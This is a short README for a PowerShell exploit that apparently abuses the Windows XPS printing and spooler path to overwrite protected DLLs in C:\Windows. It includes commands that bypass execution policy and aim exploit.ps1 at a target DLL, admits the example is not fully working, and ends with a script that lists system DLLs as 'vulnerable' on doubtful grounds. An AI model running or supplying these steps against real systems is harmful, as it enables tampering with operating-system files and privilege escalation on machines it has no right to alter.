# Usage
```
Set-ExecutionPolicy Bypass Process
.\exploit.ps1 -TargetFile C:\Windows\Some.dll
```
This will exploit the Windows operating system allowing you to modify the file Some.dll.

# Example
This isn't fully working yet due to the API calls for the XPS printer appearing to be only support using c++.
I have managed to work around this by using the `System.Printing`, however, the exploit is launched in the current user context and not under the spooler.
```
Set-ExecutionPolicy Bypass Process
.\example.ps1
```
# Finding Vulnerable DLL files
```
$aapsid = 'NT AUTHORITY\SYSTEM'

ForEach($file in (Get-ChildItem -File -recurse -Path 'C:\windows' -Filter *.dll -ErrorAction SilentlyContinue)) {
 
   $acl = Get-Acl -path $file.FullName
   ForEach($ace in $acl.Access) {
      If(($ace.FileSystemRights -eq
           [Security.AccessControl.FileSystemRights]::FullControl) -and 
            $ace.IdentityReference.Value -in $aapsid) {
               Write-Output $file.FullName
              
      }
        
   }
   
   }
```
